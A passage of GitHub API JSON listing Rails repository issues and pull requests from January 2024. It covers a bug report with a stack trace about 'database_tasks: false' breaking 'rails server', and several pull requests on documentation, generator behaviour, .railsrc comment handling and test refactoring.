            "html_url": "https://github.com/pjartarkar-mdsol",
            "followers_url": "https://api.github.com/users/pjartarkar-mdsol/followers",
            "following_url": "https://api.github.com/users/pjartarkar-mdsol/following{/other_user}",
            "gists_url": "https://api.github.com/users/pjartarkar-mdsol/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/pjartarkar-mdsol/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/pjartarkar-mdsol/subscriptions",
            "organizations_url": "https://api.github.com/users/pjartarkar-mdsol/orgs",
            "repos_url": "https://api.github.com/users/pjartarkar-mdsol/repos",
            "events_url": "https://api.github.com/users/pjartarkar-mdsol/events{/privacy}",
            "received_events_url": "https://api.github.com/users/pjartarkar-mdsol/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-29T06:40:45Z",
        "updated_at": "2024-01-31T00:19:56Z",
        "closed_at": "2024-01-31T00:19:56Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\nJust put `database_tasks: false` in all configs in database.yml file, and try running `rails server`.\r\n\r\n### Expected behavior\r\nServer should run successfully.\r\n\r\n### Actual behavior\r\nrails server failed to run.\r\n```ruby\r\n=> Booting Puma\r\n=> Rails 7.1.2 application starting in development \r\n=> Run `bin/rails server --help` for more startup options\r\nInstrumentation: OpenTelemetry::Instrumentation::Faraday was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::Rack was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::ActionPack was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::ActiveSupport was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::Rails was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::ConcurrentRuby was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::Redis was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::Mysql2 was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::PG was successfully installed\r\nInstrumentation: OpenTelemetry::Instrumentation::AwsSdk was successfully installed\r\nExiting\r\n/Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activerecord-7.1.2/lib/active_record/railtie.rb:151:in `block (3 levels) in <class:Railtie>': undefined method `name' for nil:NilClass (NoMethodError)\r\n\r\n              db_config.name,\r\n                       ^^^^^\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:97:in `class_eval'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:97:in `block in execute_hook'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:87:in `with_execution_control'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:92:in `execute_hook'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:62:in `block in on_load'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:61:in `each'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:61:in `on_load'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activerecord-7.1.2/lib/active_record/railtie.rb:147:in `block (2 levels) in <class:Railtie>'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:94:in `block in execute_hook'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:87:in `with_execution_control'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:92:in `execute_hook'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:78:in `block in run_load_hooks'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:77:in `each'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/activesupport-7.1.2/lib/active_support/lazy_load_hooks.rb:77:in `run_load_hooks'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/application/finisher.rb:93:in `block in <module:Finisher>'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/initializable.rb:32:in `instance_exec'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/initializable.rb:32:in `run'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/initializable.rb:61:in `block in run_initializers'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:228:in `block in tsort_each'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:350:in `block (2 levels) in each_strongly_connected_component'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:431:in `each_strongly_connected_component_from'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:349:in `block in each_strongly_connected_component'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:347:in `each'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:347:in `call'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:347:in `each_strongly_connected_component'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:226:in `tsort_each'\r\n        from /Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/3.2.0/tsort.rb:205:in `tsort_each'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/initializable.rb:60:in `run_initializers'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/application.rb:423:in `initialize!'\r\n        from /Users/pjartarkar/Desktop/projects/myapp/config/environment.rb:5:in `<main>'\r\n        from config.ru:3:in `require_relative'\r\n        from config.ru:3:in `block in <main>'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/builder.rb:116:in `eval'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/builder.rb:116:in `new_from_string'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/builder.rb:105:in `load_file'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/builder.rb:66:in `parse_file'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/server.rb:349:in `build_app_and_options_from_config'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/server.rb:249:in `app'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/rack-2.2.8/lib/rack/server.rb:422:in `wrapped_app'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/commands/server/server_command.rb:76:in `log_to_stdout'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/commands/server/server_command.rb:36:in `start'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/commands/server/server_command.rb:145:in `block in perform'\r\n        from <internal:kernel>:90:in `tap'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/commands/server/server_command.rb:136:in `perform'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/thor-1.3.0/lib/thor/command.rb:28:in `run'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/thor-1.3.0/lib/thor/invocation.rb:127:in `invoke_command'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/command/base.rb:178:in `invoke_command'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/thor-1.3.0/lib/thor.rb:527:in `dispatch'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/command/base.rb:73:in `perform'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/command.rb:71:in `block in invoke'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/command.rb:149:in `with_argv'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/command.rb:69:in `invoke'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/railties-7.1.2/lib/rails/commands.rb:18:in `<main>'\r\n        from <internal:/Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n        from <internal:/Users/pjartarkar/.rvm/rubies/ruby-3.2.2/lib/ruby/site_ruby/3.2.0/rubygems/core_ext/kernel_require.rb>:38:in `require'\r\n        from /Users/pjartarkar/.rvm/gems/ruby-3.2.2/gems/bootsnap-1.17.0/lib/bootsnap/load_path_cache/core_ext/kernel_require.rb:32:in `require'\r\n        from bin/rails:4:in `<main>'\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50910/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50910/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50909",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50909/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50909/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50909/events",
        "html_url": "https://github.com/rails/rails/pull/50909",
        "id": 2104413485,
        "node_id": "PR_kwDNIULOZUSoNQ",
        "number": 50909,
        "title": "[ci skip] [docs] make increment requirement explicit",
        "user": {
            "login": "jamiemccarthy",
            "id": 40373,
            "node_id": "MDQ6VXNlcjQwMzcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/40373?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jamiemccarthy",
            "html_url": "https://github.com/jamiemccarthy",
            "followers_url": "https://api.github.com/users/jamiemccarthy/followers",
            "following_url": "https://api.github.com/users/jamiemccarthy/following{/other_user}",
            "gists_url": "https://api.github.com/users/jamiemccarthy/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jamiemccarthy/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jamiemccarthy/subscriptions",
            "organizations_url": "https://api.github.com/users/jamiemccarthy/orgs",
            "repos_url": "https://api.github.com/users/jamiemccarthy/repos",
            "events_url": "https://api.github.com/users/jamiemccarthy/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jamiemccarthy/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-29T00:07:29Z",
        "updated_at": "2024-02-18T16:32:17Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50909",
            "html_url": "https://github.com/rails/rails/pull/50909",
            "diff_url": "https://github.com/rails/rails/pull/50909.diff",
            "patch_url": "https://github.com/rails/rails/pull/50909.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nAs of December, [ActionController::Metal::RateLimiting](https://github.com/rails/rails/blob/main/actionpack/lib/action_controller/metal/rate_limiting.rb) provides rate limiting through the `increment` method of any cache store. RateLimiting relies on a feature of the underlying store. This feature needs to be documented, so that it remains supported, and so alternative stores know to support it.\r\n\r\nThis PR has been created to document this behavior.\r\n\r\n### Detail\r\n\r\nThe feature is that `increment`, when passed `expires_in`, will set expiration time when the key is first created, and ignore that option if the key already exists.\r\n\r\nThat functionality is already tested [here](https://github.com/rails/rails/blob/cf26c5482924babca573e6c01594d77e3321ae58/activesupport/test/cache/behaviors/cache_increment_decrement_behavior.rb#L34), in the `CacheIncrementDecrementBehavior` test module.\r\n\r\nThis Pull Request changes the documentation of `ActiveSupport::Cache::Store.increment` to reflect a now-required feature of existing stores.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50909/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50909/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50907",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50907/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50907/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50907/events",
        "html_url": "https://github.com/rails/rails/pull/50907",
        "id": 2104402351,
        "node_id": "PR_kwDNIULOZUSD8A",
        "number": 50907,
        "title": "Skip CSS when creating APIs.",
        "user": {
            "login": "ruyrocha",
            "id": 108208,
            "node_id": "MDQ6VXNlcjEwODIwOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/108208?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruyrocha",
            "html_url": "https://github.com/ruyrocha",
            "followers_url": "https://api.github.com/users/ruyrocha/followers",
            "following_url": "https://api.github.com/users/ruyrocha/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruyrocha/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruyrocha/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruyrocha/subscriptions",
            "organizations_url": "https://api.github.com/users/ruyrocha/orgs",
            "repos_url": "https://api.github.com/users/ruyrocha/repos",
            "events_url": "https://api.github.com/users/ruyrocha/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruyrocha/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-28T23:40:26Z",
        "updated_at": "2024-01-30T01:04:54Z",
        "closed_at": "2024-01-29T17:37:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50907",
            "html_url": "https://github.com/rails/rails/pull/50907",
            "diff_url": "https://github.com/rails/rails/pull/50907.diff",
            "patch_url": "https://github.com/rails/rails/pull/50907.patch",
            "merged_at": "2024-01-29T17:37:18Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because Tailwind CSS was included when generating APIs.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the behavior of skipping CSS for APIs.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\nIt addresses part of #50900.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50907/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50907/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50904",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50904/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50904/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50904/events",
        "html_url": "https://github.com/rails/rails/pull/50904",
        "id": 2104352216,
        "node_id": "PR_kwDNIULOZUPiiA",
        "number": 50904,
        "title": "Commented out lines in .railsrc file should not be treated as arguments",
        "user": {
            "login": "williantenfen",
            "id": 3765168,
            "node_id": "MDQ6VXNlcjM3NjUxNjg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3765168?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/williantenfen",
            "html_url": "https://github.com/williantenfen",
            "followers_url": "https://api.github.com/users/williantenfen/followers",
            "following_url": "https://api.github.com/users/williantenfen/following{/other_user}",
            "gists_url": "https://api.github.com/users/williantenfen/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/williantenfen/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/williantenfen/subscriptions",
            "organizations_url": "https://api.github.com/users/williantenfen/orgs",
            "repos_url": "https://api.github.com/users/williantenfen/repos",
            "events_url": "https://api.github.com/users/williantenfen/events{/privacy}",
            "received_events_url": "https://api.github.com/users/williantenfen/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-28T21:19:42Z",
        "updated_at": "2024-01-30T20:14:30Z",
        "closed_at": "2024-01-29T18:17:30Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50904",
            "html_url": "https://github.com/rails/rails/pull/50904",
            "diff_url": "https://github.com/rails/rails/pull/50904.diff",
            "patch_url": "https://github.com/rails/rails/pull/50904.patch",
            "merged_at": "2024-01-29T18:17:30Z"
        },
        "body": "Commented out lines in .rc file should not be treated as arguments when using rails new generator command.\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because railsrc file doesn't handles commented out lines (`#`) \r\nIssue #50899 \r\n\r\n### Detail\r\n\r\nThis Pull Request changes Railtie ARGVScrubber to ignore text after `#` symbols\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50904/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50904/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50903",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50903/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50903/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50903/events",
        "html_url": "https://github.com/rails/rails/pull/50903",
        "id": 2104326982,
        "node_id": "PR_kwDNIULOZUOTDg",
        "number": 50903,
        "title": "Change skeleton test to assert exact file output",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-28T20:05:05Z",
        "updated_at": "2024-01-29T18:03:15Z",
        "closed_at": "2024-01-29T17:54:38Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50903",
            "html_url": "https://github.com/rails/rails/pull/50903",
            "diff_url": "https://github.com/rails/rails/pull/50903.diff",
            "patch_url": "https://github.com/rails/rails/pull/50903.patch",
            "merged_at": "2024-01-29T17:54:38Z"
        },
        "body": "Previously, the skeleton test would assert that every file in the `default_files` list existed. However, since there is no requirement that a file is added to this list when added to the generator the list can (and has) become out of sync with the exact generated output.\r\n\r\nThis commit refactors the skeleton test to gather the full list of files created by the generator so that it can be compared exactly to the list of `default_files`. This ensures the generated file list must be updated when any file is added or removed from the generator. Additionally, by using array equality the sorting of the `default_files` list is enforced (it was previously _mostly_ alphabetical, but not fully).\r\n\r\nThe new skeleton test assertion was written to only assert files instead of folders for a few reasons:\r\n- asserting that folders exist is redundant if a file exists within a folder (and the `default_files` list would be significantly longer with all folders)\r\n- any folder generated without any files inside it will not be tracked by Git, so other code cannot assume these empty folders exist\r\n\r\nBecause of these reasons, this patch also includes a change to no longer generate the `tmp/cache/assets` folder by default. The folder is an implementation detail of Sprockets and doesn't need any special treatment in Rails. The `Sprockets::Cache::FileStore` will create the directory if it does not exist (which it usually won't since `tmp/cache` is excluded from Git by the `.gitignore`), and the `tmp:cache:clear` task already clears all subdirectories of `tmp/cache`.\r\n\r\nFinally, some tests making assertions about the default output of the app generator were removed as they have been made redundant by the improvements to the skeleton test.\r\n\r\n---\r\n\r\n[Assert exact file output for plugins too](https://github.com/rails/rails/pull/50903/commits/c278684ae180302b073c8190d2fb50f3a359528c)\r\n\r\nIn a [previous commit][1], the App Generator skeleton test was updated to verify the exact file output when generating a new application. This commit applies the same change to the Plugin Generator.\r\n\r\nAt first, I was hesitant to add the list of dummy app files to the `default_files` for the Plugin Generator test, however it quickly became apparent that it was a good idea. Making this change exposed that recent file additions to the App Generator were added to the plugin's dummy app as well. Things like CI files, rubocop configuration, and a brakeman command should not be created for a dummy app, and are now properly excluded.\r\n\r\nSimilar to the App Generator commit, this change also removes tests that are now redundant due to the skeleton test verifying the exact list of files generated.\r\n\r\n[1]: https://github.com/rails/rails/commit/e5e4b801046bceb1067ffb316edd1ad704b6596d\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50903/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50903/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50902",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50902/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50902/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50902/events",
        "html_url": "https://github.com/rails/rails/pull/50902",
        "id": 2104264357,
        "node_id": "PR_kwDNIULOZULIjg",
        "number": 50902,
        "title": "Remove add_autoload_paths_to_load_path docs from autoloading guide",
        "user": {
            "login": "fxn",
            "id": 3387,
            "node_id": "MDQ6VXNlcjMzODc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3387?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fxn",
            "html_url": "https://github.com/fxn",
            "followers_url": "https://api.github.com/users/fxn/followers",
            "following_url": "https://api.github.com/users/fxn/following{/other_user}",
            "gists_url": "https://api.github.com/users/fxn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fxn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fxn/subscriptions",
            "organizations_url": "https://api.github.com/users/fxn/orgs",
            "repos_url": "https://api.github.com/users/fxn/repos",
            "events_url": "https://api.github.com/users/fxn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fxn/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
